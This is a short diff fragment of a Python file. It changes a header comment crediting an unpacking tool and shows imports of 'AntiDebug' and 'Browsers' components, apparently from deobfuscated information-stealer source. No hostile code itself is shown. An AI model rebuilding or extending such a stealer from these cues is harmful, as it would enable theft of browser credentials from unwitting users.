@@ -1,4 +1,4 @@
-# This file is unpacked by zlibdeob (Vault) 
+# pyunpacker v1.0 (by Vault) #
 
 from components.antidebug import AntiDebug
 from components.browsers import Browsers
